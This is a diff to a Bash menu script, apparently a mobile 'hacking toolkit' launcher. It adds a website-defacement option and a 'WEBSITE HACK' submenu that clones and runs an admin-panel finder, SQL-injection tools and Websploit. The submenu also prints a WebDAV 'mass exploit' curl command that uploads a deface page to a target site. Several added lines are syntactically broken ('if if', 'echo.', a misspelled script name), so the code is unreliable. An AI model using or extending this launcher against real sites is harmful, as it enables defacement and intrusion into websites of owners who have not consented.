@@ -208,6 +208,10 @@ echo    " (8. TOOL Cyb3r gh0st "
 echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
 echo    " (9. TOOL TU4N N1CKN4M3"
 echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (10.MAKE SCRIP DEFACE "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
+echo    " (11.WEB HACK "
+echo    "<•¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤•>"|lolcat
 read -p "(pilih nomornya>" sf;
 
 if [ $sf = 1 ] || [ $sf = 1 ]
@@ -326,6 +330,80 @@ apt update && apt upgrade -y
 git clone https://github.com/TU4NN1CKN4M3/TOOLSv2
 cd TOOLSv2
 sh TU4NN1CKN4M3.sh
-sleep 1
+fi 
+if [ $sf = 10 ] || [ $sf = 10 ]
+then 
+clear 
+pkg update && pkg upgrade -y
+pkg install python2
+git clone https://github.com/Ubaii/script-deface-creator
+cd script-deface-creator
+chmod +x create.py
+python2 create.py
+fi 
+if [ $sf = 11 ] || [ $sf = 11 ]
+then
+figlet "WEBSITE HACK" | lolcat
+echo    "==========================="|lolcat
+echo    " 1. admin-panel-finder "
+echo    "==========================="|lolcat
+echo    " 2. sqlmap"
+echo    "===========================" | lolcat
+echo    " 3. Nmap"
+echo    "===========================" | lolcat
+echo    " 4. Webdav Mass Exploit"
+echo    "===========================" | lolcat
+echo    " 5. Websploit"
+echo    "==========================="|lolcat
+echo.   " 00. back"
+echo    "==========================="|lolcat
+echo    "╭─[web hack]"
+read -p "╰─root@./MR_XID=" ga;
+if [ $ga = 1 ] || [ $ga = 1 ]
+then 
+clear 
+apt update && apt upgrade -y
+pkg install git
+git clone https://github.com/bdblackhat/admin-panel-finder.git
+cd admin-panel-finder
+python2 admin_panel_finder.py
+fi 
+if [ $ga = 2 ] || [ $ga = 2 ]
+then 
+clear 
+pkg install python2
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python2 sqlimap.py
+fi 
+if [ $ga = 3 ] || [ $ga = 3 ]
+then 
+clear
+apt update && apt upgrade -y
+apt install nmap
+fi 
+if if [ $ga = 4 ] || [ $ga = 4 ]
+then 
+clear 
+apt update && apt upgrade
+pkg install curl
+echo "jika sudah install curl selanjutnya" 
+echo "curl -T /storage/emulated/0/index.html http://webtarget.com [enter ]"
+echo "copas code di atas dengan isi web target dan sc harus bernama index html. dan tarus ke luar forder internal"
+fi 
+if if [ $ga = 5 ] || [ $ga = 5 ]
+then 
+clear
+pkg install python2
+pkg install git -y
+git clone https://github.com/blackvkng/viSQL
+cd viSQL
+chmod 777 viSQL.py
+python2 viSQL.py
+fi 
+if if [ $ga = 00 ] || [ $ga = 00 ]
+then 
+clear 
+bash toolxidploit.sh
 exit
 fi
